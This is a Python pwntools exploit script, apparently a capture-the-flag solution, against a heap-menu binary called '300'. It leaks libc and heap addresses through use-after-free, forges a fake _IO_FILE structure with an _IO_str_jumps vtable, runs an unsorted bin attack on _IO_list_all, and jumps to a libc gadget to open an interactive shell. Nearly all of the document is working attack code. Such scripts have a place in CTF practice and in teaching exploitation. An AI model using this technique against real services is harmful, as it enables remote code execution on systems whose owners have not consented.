#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('300'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') and len(sys.argv) > 2 else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)
pause()

def a(idx):
    r.sendlineafter('free\n', '1')
    r.sendlineafter('(0-9)\n', str(idx))

def w(idx, data):
    r.sendlineafter('free\n', '2')
    r.sendlineafter('(0-9)\n', str(idx))
    r.send(data, 0x300)

def p(idx):
    r.sendlineafter('free\n', '3')
    r.sendlineafter('(0-9)\n', str(idx))

def f(idx):
    r.sendlineafter('free\n', '4')
    r.sendlineafter('(0-9)\n', str(idx))

# leak libc and heap
for i in range(5):
    a(i)
f(1); p(1)
libc_base = r.leak() - libc.sym['__malloc_hook'] - 0x68
log.info('libc_base: {}'.format(hex(libc_base)))
f(3); p(3)
heap_base = r.leak() >> 12 << 12
log.info('heap_base: {}'.format(hex(heap_base)))
f(4); f(2); f(0)
libc.address += libc_base

# _IO_list_all -> _IO_str_overflow (&_IO_str_jumps+0x18)
fuck = libc.sym['_IO_list_all'] - 0x10
#vtable_addr = libc_base + 0x3c37a0 # _IO_str_jumps
vtable_addr = libc_base + 0x3be040 # _IO_str_jumps
## _IO_FILE ?
fake_chunk = flat(0, 0x61, 0, heap_base + 0x3a0)
fake_chunk += p64(0) + p64(1) + p64(0)*6 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x11) + p64(0) + p64(fuck) + p64(heap_base + 0x3d0) + p64(0)
fake_chunk += p64(0) + p64(0)*3 + p64(1) + p64(vtable_addr)
#fake_chunk += p64(libc_base + 0x4526a) 
fake_chunk += p64(libc_base + 0x4557a) 

fake_chunk = fake_chunk.ljust(0x300, 'c') 


# unsorted bin attack
fake_chunk_addr = heap_base + 0x320
a(0); a(1); f(0)
w(0, flat(0, fake_chunk_addr))
w(1, fake_chunk)

# malloc & shell out
a(2); a(2)

r.interactive()
